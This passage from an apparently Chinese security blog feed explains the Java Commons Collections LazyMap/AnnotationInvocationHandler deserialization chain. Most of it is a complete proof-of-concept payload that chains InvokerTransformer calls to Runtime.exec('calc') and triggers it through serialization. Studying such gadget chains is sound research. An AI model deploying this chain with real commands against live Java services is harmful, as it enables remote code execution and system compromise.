对象的invoke方法，继而触发了get方法，继而触发了漏洞。这是一个很妙的地方</p><p>多说无益，整paylaod吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class test2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">            org.apache.commons.collections.Transformer[] transformers &#x3D; new org.apache.commons.collections.Transformer[]&#123;</span><br><span class="line">                    &#x2F;&#x2F; 包装对象</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;getRuntime&quot;,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                            null,</span><br><span class="line">                            null,</span><br><span class="line">                    &#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;</span><br><span class="line">                            &quot;calc&quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">            Map innermap &#x3D; new HashMap();</span><br><span class="line">            Map outermap &#x3D; LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">            Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            cons.setAccessible(true);</span><br><span class="line">&#x2F;&#x2F;妙处</span><br><span class="line">            InvocationHandler handler &#x3D; (InvocationHandler) cons.newInstance(Override.class,outermap);&#x2F;&#x2F;获得一个AnnotationInvocationHandler对象</span><br><span class="line">            Map Prox &#x3D; (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);&#x2F;&#x2F;创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法</span><br><span class="line">            InvocationHandler handler1 &#x3D; (InvocationHandler) cons.newInstance(Override.class,Prox);  &#x2F;&#x2F;将代理Map传入，当代理Map被执行任一方法时，执行invoke方法</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">            ObjectOutputStream a &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;a.bin&quot;));</span><br><span class="line">            a.writeObject(handler1);</span><br><span class="line">            ObjectInputStream b &#x3D; new ObjectInputStream(new FileInputStream(&quot;a.bin&quot;));</span><br><span class="line">            b.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Transformer-Map-链&quot;&gt;&lt;a href=&quot;#Transformer-Map-链&quot; class=&quot;headerlink&quot; title=&quot;Transformer Map 链&quot;&gt;&lt;/a&gt;Transformer Map 链&lt;/h2&gt;&lt;h3 id=&quot;RCE原理</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
